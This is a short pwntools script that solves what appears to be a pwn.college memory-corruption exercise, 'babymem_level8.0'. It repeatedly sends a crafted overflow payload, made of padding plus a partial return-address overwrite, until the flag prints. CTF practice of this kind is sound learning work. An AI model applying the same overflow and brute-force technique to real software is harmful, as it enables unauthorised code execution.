from pwn import *

while True:
    p = process('/challenge/babymem_level8.0')

    p.recvuntil('Payload size:')
    p.sendline(b'100')

    #payload = b'a' * 120 + b'\x56'+b'\x22' 
    payload = b'\x00' + b'a' * 71 + p32(0x1B6A)
    #p.recvline('Send your payload')
    p.sendline(payload)

    #p.interactive()
    str = p.recvall(1)
    if str.find(b'pwn.college{') != -1:
        print(str)
        break